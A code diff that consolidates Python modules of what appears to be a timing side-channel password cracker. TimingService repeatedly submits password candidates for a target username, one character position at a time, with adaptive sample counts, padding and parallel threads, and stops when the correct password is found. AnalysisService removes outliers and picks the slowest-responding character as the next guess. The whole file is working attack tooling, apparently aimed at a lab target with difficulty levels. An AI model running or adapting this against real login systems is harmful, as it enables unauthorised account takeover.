@@ -1,93 +1,119 @@
 """
-Timing measurement service with adaptive sampling.
-
-Handles the collection of multiple timing measurements with
-intelligent sample size adjustment.
-
-Author: Your Name
-Date: 2025
+Timing and Analysis: Measurement collection, statistical analysis, and utilities.
+Consolidates timing_service.py, analysis_service.py, and stats.py.
 """
 
-from typing import List, Dict
+import statistics
+from typing import List, Dict, Tuple
 from dataclasses import dataclass
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
+import numpy as np
+from scipy import stats as scipy_stats
 
-from core.interfaces import IHttpClient, TimingMeasurement
-from core.exceptions import InsufficientDataException
-from utils.logger import Logger
+from http_client import HttpClient, TimingMeasurement
+from utils import Logger, InsufficientDataException
 
+
+# ============================================
+# DATA CLASSES
+# ============================================
 
 @dataclass
 class SamplingStrategy:
-    """
-    Configuration for adaptive sampling based on position.
+    """Configuration for adaptive sampling based on position."""
+    initial_samples: int = 10
+    middle_samples: int = 8
+    final_samples: int = 5
+    min_samples: int = 3
 
-    Early characters need more samples due to higher uncertainty.
-    Later characters can use fewer samples as patterns emerge.
-    """
-    initial_samples: int = 20   # First 3 characters
-    middle_samples: int = 15    # Characters 4-8
-    final_samples: int = 10     # Characters 9+
-    min_samples: int = 5        # Minimum required samples
 
+@dataclass
+class CharacterAnalysis:
+    """Statistical analysis result for a character candidate."""
+    character: str
+    median_time: float
+    mean_time: float
+    std_dev: float
+    confidence_score: float
+    sample_count: int
+
+
+# ============================================
+# STATISTICAL UTILITY FUNCTIONS
+# ============================================
+
+def remove_outliers(data: List[float], std_dev_threshold: float = 3.0) -> List[float]:
+    """Remove outliers using Z-score method."""
+    if len(data) < 3:
+        return data
+
+    mean = statistics.mean(data)
+    std_dev = statistics.stdev(data)
+
+    if std_dev == 0:
+        return data
+
+    return [x for x in data if abs((x - mean) / std_dev) <= std_dev_threshold]
+
+
+def calculate_confidence_interval(
+    data: List[float],
+    confidence: float = 0.95
+) -> Tuple[float, float]:
+    """Calculate confidence interval for the mean using t-distribution."""
+    if len(data) < 2:
+        return (0.0, 0.0)
+
+    n = len(data)
+    mean = np.mean(data)
+    std_err = scipy_stats.sem(data)
+    t_value = scipy_stats.t.ppf((1 + confidence) / 2, n - 1)
+    margin_of_error = t_value * std_err
+
+    return (mean - margin_of_error, mean + margin_of_error)
+
+
+def is_significantly_different(
+    data1: List[float],
+    data2: List[float],
+    alpha: float = 0.05
+) -> Tuple[bool, float]:
+    """Test if two datasets are significantly different using Welch's t-test."""
+    if len(data1) < 2 or len(data2) < 2:
+        return False, 1.0
+
+    statistic, p_value = scipy_stats.ttest_ind(data1, data2, equal_var=False)
+    return p_value < alpha, p_value
+
+
+# ============================================
+# TIMING SERVICE
+# ============================================
 
 class TimingService:
     """
     Service for collecting timing measurements with adaptive sampling.
-
-    Responsibilities:
-    - Collect multiple timing samples for reliability
-    - Adapt sample size based on position
-    - Filter failed measurements
-    - Early stopping when correct password found
-
-    Example:
-        >>> service = TimingService(http_client, strategy)
-        >>> measurements = service.measure_candidate("abc", "user", 1, position=0)
-        >>> print(f"Collected {len(measurements)} valid samples")
+    Supports both sequential and parallel execution.
     """
 
     def __init__(
         self,
-        http_client: IHttpClient,
+        http_client: HttpClient,
         sampling_strategy: SamplingStrategy,
         logger: Logger,
         use_parallel: bool = False,
         max_workers: int = 5
     ):
-        """
-        Initialize timing service.
-
-        Args:
-            http_client: HTTP client for making requests
-            sampling_strategy: Configuration for adaptive sampling
-            logger: Logger instance
-            use_parallel: Enable parallel request processing
-            max_workers: Number of parallel workers (threads)
-        """
         self.http_client = http_client
         self.strategy = sampling_strategy
         self.logger = logger
         self.use_parallel = use_parallel
         self.max_workers = max_workers
-        self._lock = threading.Lock()  # Thread-safe logging
+        self._lock = threading.Lock()
 
     def _get_sample_count(self, position: int) -> int:
-        """
-        Determine number of samples needed based on position.
-
-        Early positions need more samples because:
-        1. Higher uncertainty (no prior knowledge)
-        2. Mistakes are costlier (compound errors)
-        3. Timing differences might be smaller
-
-        Args:
-            position: Current character position (0-indexed)
-
-        Returns:
-            Number of samples to collect
-        """
+        """Determine number of samples based on position (adaptive sampling)."""
         if position < 3:
             return self.strategy.initial_samples
         elif position < 8:
@@ -102,33 +128,12 @@ class TimingService:
         difficulty: int,
         position: int
     ) -> List[TimingMeasurement]:
-        """
-        Collect multiple timing measurements for a password candidate.
-
-        Features:
-        - Adaptive sample size based on position
-        - Filters out failed requests
-        - Early stopping if correct password found
-        - Validates minimum sample requirement
-
-        Args:
-            password: Password candidate to test
-            username: Target username
-            difficulty: Difficulty level
-            position: Current position being tested (for adaptive sampling)
-
-        Returns:
-            List of successful timing measurements
-
-        Raises:
-            InsufficientDataException: If not enough valid samples collected
-        """
+        """Collect multiple timing measurements for a password candidate."""
         num_samples = self._get_sample_count(position)
         measurements: List[TimingMeasurement] = []
 
         self.logger.debug(
-            f"Measuring '{password}' with {num_samples} samples "
-            f"(position {position})"
+            f"Measuring '{password}' with {num_samples} samples (position {position})"
         )
 
         for sample_num in range(num_samples):
@@ -136,7 +141,7 @@ class TimingService:
                 password, username, difficulty
             )
 
-            # Early exit if we found the correct password
+            # Early exit if correct password found
             if measurement.is_correct:
                 self.logger.info(f"[+] Correct password found: {password}")
                 return [measurement]
@@ -167,25 +172,7 @@ class TimingService:
         position: int,
         password_length: int = None
     ) -> Dict[str, List[TimingMeasurement]]:
-        """
-        Measure timing for all possible next characters.
-
-        Args:
-            current_password: Password prefix discovered so far
-            charset: String of possible characters (e.g., "abc...xyz")
-            username: Target username
-            difficulty: Difficulty level
-            position: Current position being tested
-            password_length: Total password length for padding (optional)
-
-        Returns:
-            Dictionary mapping character -> list of measurements
-
-        Example:
-            >>> results = service.measure_all_candidates("ha", "abc", "user", 1, 2)
-            >>> print(results.keys())
-            dict_keys(['a', 'b', 'c'])
-        """
+        """Measure timing for all possible next characters."""
         if self.use_parallel:
             return self._measure_all_candidates_parallel(
                 current_password, charset, username, difficulty, position, password_length
@@ -204,7 +191,7 @@ class TimingService:
         position: int,
         password_length: int = None
     ) -> Dict[str, List[TimingMeasurement]]:
-        """Sequential (non-parallel) measurement of all candidates."""
+        """Sequential measurement of all candidates."""
         results: Dict[str, List[TimingMeasurement]] = {}
 
         self.logger.info(f"Testing position {position} ({len(charset)} candidates) [SEQUENTIAL]")
@@ -214,12 +201,9 @@ class TimingService:
 
             # Pad to known password length if provided
             if password_length is not None and len(candidate) < password_length:
-                padding_char = charset[0]  # Use first char of charset for padding
+                padding_char = charset[0]
                 padding_needed = password_length - len(candidate)
                 candidate = candidate + (padding_char * padding_needed)
-                self.logger.debug(
-                    f"Padded '{current_password + char}' to length {password_length}: '{candidate}'"
-                )
 
             try:
                 measurements = self.measure_candidate(
@@ -238,7 +222,6 @@ class TimingService:
                     f"Skipping '{char}': {e.samples_collected} samples "
                     f"(need {e.samples_required})"
                 )
-                # Use empty list for insufficient data
                 results[char] = []
 
         return results
@@ -304,7 +287,7 @@ class TimingService:
                         if measurements and measurements[0].is_correct:
                             with self._lock:
                                 self.logger.info(f"[+] Complete password found!")
-                            # Cancel remaining futures and return immediately
+                            # Cancel remaining futures
                             for f in future_to_char:
                                 f.cancel()
                             return {char: measurements}
@@ -317,3 +300,123 @@ class TimingService:
                     results[char] = []
 
         return results
+
+
+# ============================================
+# ANALYSIS SERVICE
+# ============================================
+
+class AnalysisService:
+    """Statistical analysis of timing measurements."""
+
+    def __init__(
+        self,
+        confidence_level: float = 0.95,
+        min_time_difference: float = 0.001,
+        outlier_threshold: float = 3.0,
+        logger: Logger = None
+    ):
+        self.confidence_level = confidence_level
+        self.min_time_difference = min_time_difference
+        self.outlier_threshold = outlier_threshold
+        self.logger = logger or Logger()
+
+    def analyze_measurements(
+        self,
+        measurements: List[TimingMeasurement]
+    ) -> CharacterAnalysis:
+        """Analyze timing measurements for a single character."""
+        if not measurements:
+            return CharacterAnalysis(
+                character="",
+                median_time=0.0,
+                mean_time=0.0,
+                std_dev=0.0,
+                confidence_score=0.0,
+                sample_count=0
+            )
+
+        # Extract timing data
+        times = [m.elapsed_time for m in measurements]
+
+        # Remove outliers
+        cleaned_times = remove_outliers(times, self.outlier_threshold)
+
+        if not cleaned_times:
+            cleaned_times = times
+
+        # Calculate statistics
+        median_time = statistics.median(cleaned_times)
+        mean_time = statistics.mean(cleaned_times)
+        std_dev = statistics.stdev(cleaned_times) if len(cleaned_times) > 1 else 0.0
+
+        # Calculate confidence score
+        confidence_score = self._calculate_confidence(cleaned_times)
+
+        return CharacterAnalysis(
+            character=measurements[0].password[-1] if measurements[0].password else "",
+            median_time=median_time,
+            mean_time=mean_time,
+            std_dev=std_dev,
+            confidence_score=confidence_score,
+            sample_count=len(measurements)
+        )
+
+    def _calculate_confidence(self, times: List[float]) -> float:
+        """Calculate confidence score based on sample consistency."""
+        if len(times) < 2:
+            return 0.5
+
+        # Use coefficient of variation (CV) as confidence metric
+        mean = statistics.mean(times)
+        std_dev = statistics.stdev(times)
+
+        if mean == 0:
+            return 0.0
+
+        cv = std_dev / mean
+
+        # Lower CV = higher confidence (invert and normalize)
+        confidence = 1.0 / (1.0 + cv)
+
+        return min(max(confidence, 0.0), 1.0)
+
+    def compare_candidates(
+        self,
+        analyses: List[CharacterAnalysis]
+    ) -> Tuple[str, float]:
+        """Compare all candidates and select the best one."""
+        if not analyses:
+            return None, 0.0
+
+        # Sort by median time (descending - slower is better)
+        sorted_analyses = sorted(
+            analyses,
+            key=lambda a: a.median_time,
+            reverse=True
+        )
+
+        best = sorted_analyses[0]
+        second_best = sorted_analyses[1] if len(sorted_analyses) > 1 else None
+
+        # Log top candidate
+        self.logger.info(
+            f"Top candidate: '{best.character}' "
+            f"({best.median_time:.6f}s, conf={best.confidence_score:.3f})"
+        )
+
+        if second_best:
+            time_diff = best.median_time - second_best.median_time
+            self.logger.info(
+                f"Runner-up: '{second_best.character}' "
+                f"({second_best.median_time:.6f}s, diff={time_diff:.6f}s)"
+            )
+
+            # Warn if difference is small
+            if time_diff < self.min_time_difference:
+                self.logger.warning(
+                    f"Small timing difference ({time_diff:.6f}s), "
+                    "result may be unreliable"
+                )
+
+        return best.character, best.confidence_score
